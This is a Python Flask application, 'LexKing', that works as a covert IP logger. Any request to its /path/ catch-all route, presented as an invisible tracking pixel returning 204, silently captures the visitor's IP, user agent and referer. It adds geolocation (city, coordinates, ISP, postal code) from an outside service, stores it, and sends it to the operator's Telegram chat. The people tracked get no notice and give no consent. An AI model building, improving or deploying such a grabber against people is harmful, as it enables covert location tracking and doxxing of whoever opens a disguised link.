# app.py
from flask import Flask, jsonify, request
import requests
import os
import logging
from datetime import datetime
import dotenv

from log_manager import log_manager

# Configuração básica de logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Carregar variáveis de ambiente
dotenv.load_dotenv()

app = Flask(__name__)

# Configurações
TELEGRAM_BOT_TOKEN = os.getenv("TOKEN_API_TELEGRAM")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")  # ID do chat para notificações
ENABLE_NOTIFICATIONS = os.getenv("ENABLE_TELEGRAM_NOTIFICATIONS", "false").lower() == "true"

# ==================== FUNÇÕES AUXILIARES ====================

def obter_geolocalizacao(ip: str) -> dict:
    """Obtém informações de geolocalização para um IP."""
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}",
            timeout=5,
            params={"fields": "status,message,country,regionName,city,zip,lat,lon,org,query"}
        )
        geo = response.json()

        if geo.get("status") == "success":
            return geo
        else:
            logger.warning(f"Falha na geolocalização para {ip}: {geo.get('message', 'Unknown')}")
            return {}
    except Exception as e:
        logger.error(f"Erro ao obter geolocalização para {ip}: {e}")
        return {}


def enviar_notificacao_telegram(data: dict) -> bool:
    """Envia notificação para o Telegram sobre novo acesso."""
    if not ENABLE_NOTIFICATIONS or not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False

    try:
        mensagem = (
            f"🔔 *Novo Acesso Detectado*\n\n"
            f"🌐 *IP:* `{data.get('ip', 'N/A')}`\n"
            f"📍 *Localização:* {data.get('city', 'N/A')}, {data.get('country', 'N/A')}\n"
            f"🏢 *Provedor:* {data.get('org', 'N/A')}\n"
            f"🕒 *Data/Hora:* {datetime.fromisoformat(data['timestamp']).strftime('%d/%m/%Y %H:%M:%S')}\n"
            f"💻 *User-Agent:* {data.get('ua', 'N/A')[:50]}..."
        )

        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": mensagem,
            "parse_mode": "Markdown"
        }

        response = requests.post(url, json=payload, timeout=5)
        response.raise_for_status()

        logger.info(f"Notificação enviada para Telegram: {data.get('ip')}")
        return True
    except Exception as e:
        logger.error(f"Erro ao enviar notificação Telegram: {e}")
        return False


# ==================== ROTAS ====================

@app.route("/")
def index():
    """Página inicial com estilo LexKing"""
    stats = log_manager.obter_estatisticas()

    html = f"""
    <!DOCTYPE html>
    <html lang="pt-br">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>LexKing · Sistema de Localização de IPs</title>
        <style>
            body {{
                font-family: 'Consolas', monospace;
                background: radial-gradient(circle at 20% 20%, #0a0f1a, #000);
                color: #00ff88;
                margin: 0;
                padding: 0;
                overflow-x: hidden;
            }}
            .container {{
                max-width: 900px;
                margin: 60px auto;
                padding: 40px;
                background: rgba(0, 10, 25, 0.75);
                border: 1px solid #00ff88;
                border-radius: 12px;
                box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
                backdrop-filter: blur(6px);
            }}
            h1 {{
                text-align: center;
                color: #00ffc6;
                font-size: 2em;
                letter-spacing: 1px;
                text-shadow: 0 0 10px #00ffc6;
            }}
            .stats {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
                gap: 25px;
                margin-top: 40px;
            }}
            .stat-box {{
                background: rgba(0, 255, 136, 0.05);
                border: 1px solid rgba(0,255,136,0.3);
                border-radius: 10px;
                text-align: center;
                padding: 25px 10px;
                transition: 0.3s;
            }}
            .stat-box:hover {{
                transform: scale(1.05);
                box-shadow: 0 0 15px rgba(0,255,136,0.4);
                background: rgba(0,255,136,0.1);
            }}
            .stat-number {{
                font-size: 2.4em;
                font-weight: bold;
                color: #00ff88;
                text-shadow: 0 0 12px #00ff88;
            }}
            .stat-label {{
                color: #aaa;
                font-size: 0.9em;
                margin-top: 8px;
                letter-spacing: 0.5px;
            }}
            .info {{
                margin-top: 40px;
                padding: 20px;
                background: rgba(0,255,136,0.07);
                border-left: 4px solid #00ff88;
                border-radius: 6px;
                font-size: 0.95em;
            }}
            .matrix-bg {{
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: -1;
                background: repeating-linear-gradient(
                    rgba(0,255,136,0.05) 0px,
                    rgba(0,255,136,0.05) 1px,
                    transparent 1px,
                    transparent 3px
                );
                animation: flicker 2s infinite alternate;
            }}
            @keyframes flicker {{
                0% {{ opacity: 0.8; }}
                100% {{ opacity: 0.4; }}
            }}
            .footer {{
                margin-top: 50px;
                text-align: center;
                color: #555;
                font-size: 0.8em;
            }}
        </style>
    </head>
    <body>
        <div class="matrix-bg"></div>
        <div class="container">
            <h1>🧠 LexKing · Sistema de Localização de IPs</h1>
            <p style="text-align:center;">Monitorando conexões e registrando entidades digitais.</p>

            <div class="stats">
                <div class="stat-box">
                    <div class="stat-number">{stats.get('total', 0)}</div>
                    <div class="stat-label">Total de Registros</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">{stats.get('ips_unicos', 0)}</div>
                    <div class="stat-label">IPs Únicos</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">{stats.get('cidades_unicas', 0)}</div>
                    <div class="stat-label">Cidades Únicas</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">{stats.get('paises_unicos', 0)}</div>
                    <div class="stat-label">Países Únicos</div>
                </div>
            </div>

            <div class="info">
                <strong>💡 Dica:</strong> Acesse o bot do Telegram para consultar logs, rastrear IPs e analisar padrões.
            </div>

            <div class="footer">
                LexKing™ · since 2025 · <span style="color:#00ff88;">v1.0</span>
            </div>
        </div>
    </body>
    </html>
    """
    return html



@app.route("/health")
def health():
    """Endpoint de health check."""
    return jsonify({
        "status": "ok",
        "timestamp": datetime.now().isoformat(),
        "notifications_enabled": ENABLE_NOTIFICATIONS
    })


@app.route("/api/stats")
def api_stats():
    """Retorna estatísticas em formato JSON."""
    return jsonify(log_manager.obter_estatisticas())


@app.route("/path:fake")
@app.route("/path/<path:fake>")
def catch(fake=""):
    """
    Captura requisições e registra informações de geolocalização.
    Retorna 204 No Content (útil para tracking pixel invisível).
    """
    # Obter IP do cliente (considera proxies)
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()

    # Garantir que o IP não seja None
    ip = ip or "unknown"

    ua = request.headers.get("User-Agent", "Unknown")
    referer = request.headers.get("Referer", "Direct")

    # Obter informações de geolocalização
    geo = obter_geolocalizacao(ip)

    # Montar dicionário de dados
    data = {
        "timestamp": datetime.now().isoformat(),
        "ip": ip,
        "ua": ua,
        "referer": referer,
        "path": fake,
        "city": geo.get("city"),
        "region": geo.get("regionName"),
        "country": geo.get("country"),
        "loc": f"{geo.get('lat')},{geo.get('lon')}" if geo.get('lat') and geo.get('lon') else None,
        "org": geo.get("org"),
        "postal": geo.get("zip")
    }

    # Salvar no log usando o gerenciador
    log_manager.adicionar_registro(data)

    # Enviar notificação para Telegram (se habilitado)
    enviar_notificacao_telegram(data)

    logger.info(f"Acesso capturado: {ip} - {data.get('city', 'N/A')}, {data.get('country', 'N/A')}")

    # Retornar 204 No Content (tracking pixel invisível)
    return ("", 204)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

